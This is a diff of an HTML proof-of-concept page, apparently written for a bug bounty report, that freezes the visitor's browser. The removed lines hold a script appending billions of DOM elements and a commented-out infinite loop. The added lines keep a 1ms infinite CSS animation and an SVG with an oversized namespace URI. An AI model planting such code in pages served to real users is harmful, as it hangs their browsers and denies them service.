@@ -1,16 +1,10 @@
 <!DOCTYPE html>
-<html lang="en">
+<html>
 <head>
-  <meta charset="UTF-8">
-  <title>💥 UI Freeze PoC</title>
   <style>
     body::before {
-      content: "🐛 UI Freeze in Progress...";
-      animation: spin 1ms infinite linear;
-      display: block;
-      font-size: 24px;
-      padding: 10px;
-      color: red;
+      content: "🐛";
+      animation: spin 1ms infinite;
     }
 
     @keyframes spin {
@@ -20,23 +14,11 @@
   </style>
 </head>
 <body>
-  <h1>💣 Bug Bounty PoC: UI Freeze via DOM Overload</h1>
-  <p>If this page freezes your browser, the PoC is successful 😈</p>
-  <script>
-    // DOM Overload
-    for (let i = 0; i < 50000000000; i++) {
-      const el = document.createElement('div');
-      el.innerText = '💥 Freeze Element #' + i;
-      document.body.appendChild(el);
-    }
-
-    // Optional: Infinite Loop (can be uncommented if needed)
-    /*
-    function infiniteFreeze() {
-      while (true) {}
-    }
-    infiniteFreeze();
-    */
-  </script>
+  <svg xmlns="http://www.w3.org/200000000000/svg">
+    <g>
+      <circle r="100.000" cx="100.000" cy="100.000" />
+      <!-- ... -->
+    </g>
+  </svg>
 </body>
 </html>
